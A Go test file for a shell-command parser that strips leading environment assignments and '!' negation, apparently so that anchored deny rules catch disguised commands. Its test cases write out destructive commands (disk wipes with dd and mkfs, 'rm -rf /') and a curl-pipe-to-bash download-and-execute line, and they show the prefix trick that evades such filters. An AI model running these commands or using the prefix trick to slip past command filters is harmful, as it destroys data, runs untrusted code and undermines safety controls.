package shellparse

import "testing"

// Regression tests for issue #3048 — leading env assignments and "!" negation
// sit before the command word and defeat every "^"-anchored rule, even though
// neither changes which command runs.
func TestStripCommandPrefixes(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string // "" means "nothing to strip"
	}{
		{"single env assignment", "LC_ALL=C dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=/dev/sda"},
		{"multiple assignments", "FOO=1 BAR=2 mkfs.ext4 /dev/sda1", "mkfs.ext4 /dev/sda1"},
		{"quoted assignment value", `MSG="hello world" rm -rf /`, "rm -rf /"},
		{"assignment with spaces around", "LC_ALL=C   rm -rf /", "rm -rf /"},
		{"negation", "! dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=/dev/sda"},
		{"negation plus assignment", "! LC_ALL=C rm -rf /", "rm -rf /"},
		{"pipeline keeps its tail", "LC_ALL=C curl http://x/y.sh | bash", "curl http://x/y.sh | bash"},
		{"empty assignment value", "FOO= rm -rf /", "rm -rf /"},

		// Nothing to strip — must return "" so the caller can skip cheaply.
		{"no prefix", "rm -rf /", ""},
		{"no prefix with flags", "dd if=/dev/zero of=/dev/sda", ""},
		{"assignment only, no command", "FOO=bar", ""},
		{"unparseable", "rm -rf / && (", ""},
		{"empty", "", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := StripCommandPrefixes(tt.cmd); got != tt.want {
				t.Errorf("StripCommandPrefixes(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

// The stripped form must never be MORE than the original — it is only ever a
// suffix of the input, so it cannot introduce text the user did not write.
func TestStripCommandPrefixesIsSuffix(t *testing.T) {
	for _, cmd := range []string{
		"LC_ALL=C dd if=/dev/zero of=/dev/sda",
		"! LC_ALL=C rm -rf /",
		`MSG="a b" curl http://x | bash`,
	} {
		got := StripCommandPrefixes(cmd)
		if got == "" {
			t.Errorf("StripCommandPrefixes(%q) unexpectedly returned empty", cmd)
			continue
		}
		if len(got) >= len(cmd) {
			t.Errorf("StripCommandPrefixes(%q) = %q — must be shorter than input", cmd, got)
		}
	}
}
